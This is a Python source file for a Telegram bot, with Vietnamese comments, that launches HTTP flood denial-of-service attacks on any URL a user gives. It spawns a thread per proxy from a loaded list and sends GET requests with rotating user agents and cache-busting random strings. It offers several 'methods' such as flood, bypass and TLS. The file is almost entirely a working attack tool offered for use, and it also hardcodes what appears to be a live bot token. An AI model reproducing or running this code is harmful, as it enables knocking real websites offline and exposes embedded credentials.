import requests
import threading
from time import sleep
from random import choice, randint
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from telegram import Update
from telegram.ext.callbackcontext import CallbackContext

# Biến toàn cục
STATUS = None
BOT_STATUS = True
proxies = []
admin_id = 6081972689  # Thay bằng Telegram ID của admin
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/110.0.1587.49",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.1 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1; MI 6X Build/OPM1.171019.011) AppleWebKit/601.6 (KHTML, like Gecko) Chrome/57.0.2751.255 Mobile Safari/600.1",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36"
]
vpn_user_agents = [
    "Shadowrocket/2.1.10 CFNetwork/1220.1 Darwin/20.3.0",
    "v2rayNG/1.7.20 (Android; Mobile; rv:91.0) Gecko/20100101 Firefox/91.0",
    "CyberGhost/7.4.1 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "IPVanish/3.0.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "PrivateVPN/3.1.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "TunnelBear/3.5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Windscribe/2.3.4 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "HMA/5.5.7 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "SaferVPN/4.0.1 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "VyprVPN/4.2.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mullvad/2021.8 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Tor/0.4.5.7 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]
# Đọc proxy từ tệp
def load_proxies():
    global proxies
    try:
        with open('proxy.txt') as f:
            proxies = f.read().splitlines()
        print("Đã tải danh sách proxy.")
    except FileNotFoundError:
        print("Không tìm thấy tệp proxy.txt.")

# Random token cho VPN
def random_token():
    return ''.join([choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(16)])

# Thay thế chuỗi %RAND%
def replace_rand(url):
    while "%RAND%" in url:
        rand_str = ''.join([chr(randint(97, 122)) for _ in range(8)])
        url = url.replace("%RAND%", rand_str, 1)
    return url

# Tự động thêm www
def add_www(url):
    if "://" in url:
        scheme, rest = url.split("://", 1)
        if not rest.startswith("www."):
            rest = "www." + rest
        return f"{scheme}://{rest}"
    return url

# Hàm đếm ngược
def countdown(s, update, url):
    global STATUS
    STATUS = True
    for i in range(s, 0, -1):
        sleep(1)
    STATUS = False
    update.message.reply_text(f"Tấn công {url} đã kết thúc.")

# Hàm thực hiện tấn công với một proxy
def attack_thread(url, proxy, headers, update):
    while STATUS:
        if not BOT_STATUS:
            break
        try:
            requests.get(url, proxies=proxy, headers=headers, timeout=5)
            print(f"Tấn công với proxy: {proxy['http']}")
        except:
            pass

def start_attack(url, duration, headers_template, update):
    global STATUS
    threading.Thread(target=countdown, args=(duration, update, url)).start()
    url = add_www(url)
    for proxy_line in proxies:
        proxy = {'http': 'http://' + proxy_line}
        headers = headers_template.copy()
        headers['User-Agent'] = choice(user_agents)
        threading.Thread(target=attack_thread, args=(url, proxy, headers, update)).start()

def vpn_attack(url, duration, update):
    headers_template = {
        'Authorization': f"Bearer {random_token()}",
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công TLS
def tls_attack(url, duration, update):
    headers_template = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'HTTP-Version': 'HTTP/2' if randint(0, 1) else 'HTTP/1.1',
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công VN
def vn_attack(url, duration, update):
    headers_template = {
        'Geo-IP': 'VN',
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công BYPASS
def bypass_attack(url, duration, update):
    headers_template = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công FLOOD
def flood_attack(url, duration, update):
    headers_template = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'HTTP-Version': 'HTTP/2' if randint(0, 1) else 'HTTP/1.1',
    }
    start_attack(url, duration, headers_template, update)

# Kiểm tra quyền admin
def is_admin(update):
    return update.message.from_user.id == admin_id

# Lệnh bật bot
def start_bot(update: Update, context: CallbackContext):
    global BOT_STATUS
    if not is_admin(update):
        update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return
    BOT_STATUS = True
    update.message.reply_text("Bot đã bật và sẵn sàng hoạt động")

# Lệnh tắt bot
def stop_bot(update: Update, context: CallbackContext):
    global BOT_STATUS
    if not is_admin(update):
        update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return
    BOT_STATUS = False
    update.message.reply_text("Bot đã tắt")

# Lệnh xử lý /tang
def tang(update, context):
    global BOT_STATUS
    if not BOT_STATUS:
        update.message.reply_text("Bot đang tắt do admin bảo trì @quangnqtoolcode để update")
        return
    try:
        method = context.args[0].lower()
        url = replace_rand(context.args[1])  # Random %RAND%
        duration = int(context.args[2])
        if method == "vpn":
            update.message.reply_text(f"Bắt đầu VPN:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=vpn_attack, args=(url, duration, update)).start()
        elif method == "vn":
            update.message.reply_text(f"Bắt đầu VN:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=vn_attack, args=(url, duration, update)).start()
        elif method == "tls":
            update.message.reply_text(f"Bắt đầu TLS:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=tls_attack, args=(url, duration, update)).start()
        elif method == "bypass":
            update.message.reply_text(f"Bắt đầu BYPASS:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=bypass_attack, args=(url, duration, update)).start()
        elif method == "flood":
            update.message.reply_text(f"Bắt đầu FLOOD:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=flood_attack, args=(url, duration, update)).start()
        else:
            update.message.reply_text("method không hợp lệ")
    except (IndexError, ValueError):
        update.message.reply_text("Sai cú pháp. Sử dụng: /attack <method> <url> <time>")
        
def help_command(update: Update, context: CallbackContext):
    help_text = """
Danh sách các lệnh:
- /start: Hiển thị danh sách lệnh
- /help: Hiển thị danh sách lệnh
- /attack <method> <url> <time>: Tấn công với phương thức và thời gian
    + method: vpn, vn, tls, bypass, flood
"""
    update.message.reply_text(help_text)
    
def start_command(update: Update, context: CallbackContext):
    update.message.reply_text("Chào mừng bạn đến với bot! Sử dụng /help để xem danh sách các lệnh")
    
   
def update_proxy(update: Update, context: CallbackContext):
    global proxies
    if not is_admin(update):
        update.message.reply_text("Bạn không có quyền thực hiện thao tác này")
        return
    file = update.message.document.get_file()
    file.download("proxy.txt")
    load_proxies()
    proxy_count = len(proxies)
    from datetime import datetime
    time_updated = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    update.message.reply_text(f"Danh sách proxy đã được cập nhật thành công. Hiện có {proxy_count} proxy")
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Bot đã cập nhật lại danh sách proxy vào lúc {time_updated}\nSố lượng proxy: {proxy_count}"
    )
# Hàm chính
def main():
    TOKEN = '8178485363:AAGzYzstr-C6Gj9A8sR2MguA70f5wPFg6Q0'
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    load_proxies()
    dp.add_handler(CommandHandler("on", start_bot))
    dp.add_handler(CommandHandler("off", stop_bot))
    dp.add_handler(CommandHandler("attack", tang))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("start", start_command))
    dp.add_handler(MessageHandler(Filters.document, update_proxy))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main() 
